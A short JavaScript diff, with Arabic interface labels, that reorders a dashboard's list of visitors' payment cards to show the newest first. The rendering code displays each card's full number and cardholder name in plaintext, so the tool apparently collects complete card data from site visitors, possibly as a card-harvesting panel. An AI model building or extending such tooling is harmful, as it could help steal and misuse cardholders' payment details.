@@ -538,9 +538,12 @@
         html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
         html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقات الدفع</h3>';
         html += '<div class="space-y-3">';
-        visitor.paymentCards.forEach((card, i) => {
+        // Reverse to show newest first
+        const reversedCards = [...visitor.paymentCards].reverse();
+        reversedCards.forEach((card, revIndex) => {
+          const originalIndex = visitor.paymentCards.length - 1 - revIndex;
           html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-          html += '<p class="font-medium mb-2 text-purple-700">بطاقة ' + (i + 1) + '</p>';
+          html += '<p class="font-medium mb-2 text-purple-700">بطاقة ' + (originalIndex + 1) + '</p>';
           html += '<div class="grid grid-cols-2 gap-3 text-sm">';
           html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
           html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
